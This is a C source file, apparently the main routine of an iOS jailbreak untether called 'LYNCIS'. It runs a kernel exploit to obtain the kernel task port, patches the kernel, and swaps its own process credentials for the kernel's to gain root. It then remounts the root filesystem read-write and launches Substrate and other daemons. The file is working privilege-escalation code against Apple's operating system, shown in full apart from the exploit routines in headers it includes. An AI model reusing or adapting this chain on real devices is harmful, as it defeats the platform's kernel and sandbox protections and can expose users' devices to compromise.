#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/syslog.h>
#include <sys/mount.h>
#include <sys/sysctl.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <dirent.h>
#include <spawn.h>

#include "common.h"
#include "io.h"
#include "offsets.h"
#include "memory.h"
#include "exploit.h"
#include "patches.h"
#include "utils.h"

kinfo_t *kinfo = NULL;

int remount_rootfs(void) {
    char *dev = strdup("/dev/disk0s1s1");
    int rv = mount("hfs", "/", MNT_UPDATE, &dev);
    if (rv == 0) goto done;
    usleep(100000);
    sync();

    for (int i = 0; i < 50; i++) {
        rv = mount("hfs", "/", MNT_UPDATE, &dev);
        if (rv == 0) goto done;
        usleep(10000);
    }

done:
    free(dev);
    return rv;
}

int load_run_commands(void) {
    DIR *dir = opendir("/etc/rc.d");
    if (dir == NULL) return -1;

    struct dirent *entry = NULL;
    char path_buf[PATH_MAX] = {0};
    char *args[] = {path_buf, NULL};

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        bzero(path_buf, PATH_MAX);
        snprintf(path_buf, PATH_MAX, "/etc/rc.d/%s", entry->d_name);

        pid_t pid = -1;
        int rv = posix_spawn(&pid, path_buf, NULL, NULL, args, environ);
        if (rv != 0 || pid == -1) {
            print_log("[WARNING] failed to start: %s\n", path_buf);
        }
    }

    closedir(dir);
    return 0;
}

int load_user_daemons(void) {
    char *args[] = {"/bin/launchctl", "load", "/Library/LaunchDaemons", NULL};
    pid_t pid = -1;
    int status = -1;

    int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
    if (rv != 0 || pid == -1) {
        print_log("[ERROR] failed to start user daemons\n");
        return rv;
    }
    
    do { if (waitpid(pid, &status, 0) == -1) return status; }
    while (!WIFEXITED(status) && !WIFSIGNALED(status));
    return status;
}

int start_daemons(void) {
    load_run_commands();
    load_user_daemons();

    if (access("/usr/libexec/substrate", F_OK) == 0) {
        char *args[] = {"/usr/libexec/substrate", NULL};
        pid_t pid = -1;
        int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
        if (rv != 0 || pid == -1) {
            print_log("[WARNING] failed to start substrate\n");
        }
    }

    if (access("/usr/libexec/CrashHousekeeping.backup", F_OK) == 0) {
        char *args[] = {"/usr/libexec/CrashHousekeeping.backup", NULL};
        pid_t pid = -1;
        int rv = posix_spawn(&pid, args[0], NULL, NULL, args, environ);
        if (rv != 0 || pid == -1) {
            print_log("[WARNING] failed to start CrashHousekeeping\n");
        }
    }

    return 0;
}

int main(void) {
    print_log("[*][*][*] LYNCIS UNTETHER [*][*][*]\n");
    print_log("[LYNCIS] --> running exploit");

    kinfo = run_exploit();
    if (kinfo == NULL) goto done;

    print_log("[LYNCIS] --> tfp0: 0x%x\n", kinfo->tfp0);
    print_log("[LYNCIS] --> kernel_base: 0x%x\n", kinfo->kernel_base);
    print_log("[LYNCIS] --> kernel_slide: 0x%x\n", kinfo->kernel_slide);

    if (patch_kernel(kinfo) != 0) goto done;
    print_log("[LYNCIS] --> kernel patched\n");

    uint32_t self_ucred = 0;
    if (getuid() != 0 || getgid() != 0) {
        uint32_t kern_ucred = rk32(kinfo->kern_proc_addr + koffsetof(proc, ucred));
        self_ucred = rk32(kinfo->self_proc_addr + koffsetof(proc, ucred));
        wk32(kinfo->self_proc_addr + koffsetof(proc, ucred), kern_ucred);
        setuid(0);
        setgid(0);
    }

    if (remount_rootfs() != 0) goto done;
    print_log("[LYNCIS] --> rootfs remounted\n");

    if (access("/.cydia_no_stash", F_OK) != 0) {
        if (create_file("/.cydia_no_stash", 0644, 0, 0) != 0) goto done;
    }

done:
    print_log("[LYNCIS] --> starting daemons\n");
    start_daemons();

    print_log("[LYNCIS] --> cleaning up\n");
    if (self_ucred != 0) wk32(kinfo->self_proc_addr + koffsetof(proc, ucred), self_ucred);
    deinit_exploit(kinfo);
    usleep(100000);

    print_log("[LYNCIS] --> done!\n");
    exit(0);
    return 0;
}
